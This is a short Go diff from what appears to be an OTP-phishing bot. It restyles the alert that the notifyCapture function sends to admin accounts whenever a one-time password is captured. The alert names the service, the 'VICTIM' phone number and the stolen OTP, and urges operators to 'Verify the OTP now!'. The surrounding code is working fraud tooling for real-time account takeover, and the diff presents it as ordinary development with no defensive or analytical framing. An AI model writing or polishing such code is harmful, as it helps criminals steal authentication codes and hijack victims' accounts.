@@ -271,18 +271,31 @@ func (b *Bot) notifyCapture(campaignID int64, phone, otp, service string) {
 	}
 
 	for _, adminID := range cfg.AdminIDs {
-		text := fmt.Sprintf(`🎉 *OTP CAPTURED!* 🎉
+		text := fmt.Sprintf(`🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
 
-━━━━━━━━━━━━━━━━━━━━
-🏷️ Service: %s
-📱 Victim: %s
-━━━━━━━━━━━━━━━━━━━━
-🔐 *OTP: %s*
-━━━━━━━━━━━━━━━━━━━━
-⏱️ Captured: %s
+🎯 *OTP CAPTURE SUCCESS!*
 
-💰 Go verify this OTP now!
-`, service, maskPhone(phone), otp, time.Now().Format("15:04:05"))
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🏷️ *SERVICE:* %s
+📱 *VICTIM:* %s
+🔐 *OTP:* ||%s||
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⏱️ *Time:* %s
+💎 *Status:* VERIFIED ✓
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎰 *Action Required:*
+Verify the OTP now!
+
+🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`, 
+			strings.ToUpper(service), 
+			maskPhone(phone), 
+			otp, 
+			time.Now().Format("15:04:05"))
 
 		b.sendMessage(adminID, text)
 	}
